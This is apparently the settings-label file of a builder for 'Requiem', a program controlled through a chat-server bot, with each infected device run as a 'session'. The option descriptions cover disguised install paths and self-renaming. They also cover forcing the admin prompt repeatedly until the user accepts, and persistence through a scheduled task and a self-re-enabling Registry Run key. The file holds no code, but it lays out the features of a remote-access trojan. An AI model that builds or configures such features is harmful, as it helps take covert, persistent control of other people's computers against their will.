bot.name: Server ID
bot.info: The ID of the server that will control the bot.

bot.name: Category ID
bot.info: The ID of the category each session will be controlled in.

bot.name: Tracking ID
bot.info: A custom ID/code to help you keep track of this build.

setup.name: Use custom directory
setup.info: Installs Requiem to a custom directory. If unchecked, Requiem will install to the music folder or Program Files folder if it has admin privileges.

setup.name: Custom directory path
setup.info: The path of the directory. Use "<USERPROFILE>" for the user profile directory or "<USER>" for the device's username.

setup.name: Use custom name
setup.info: Rename Requiem to a custom name.

setup.name: Custom name
setup.info: The name Requiem will rename itself to.

options.name: Require admin
options.info: Requires Requiem to have admin privileges to run.

options.name: Prompt admin
options.info: Triggers the User Account Control prompt to run Requiem as admin.

options.name: Force admin
options.info: Continuously triggers the User Account Control prompt until the user accepts.

options.name: Continue without admin
options.info: If the user declines the Account Control prompt while "Require admin" is enabled, Requiem will still run.

persistence.name: Persistence name
persistence.info: The name of all persistence values or items.

persistence.name: Task Schedular
persistence.info: Uses the Task Schedular, It will start Requiem continuosly after that every 8 minutes.

persistence.name: Registry
persistence.info: Uses the Run key in the Registry, It will also enable itself if it was disabled from e.g. Task Manager.
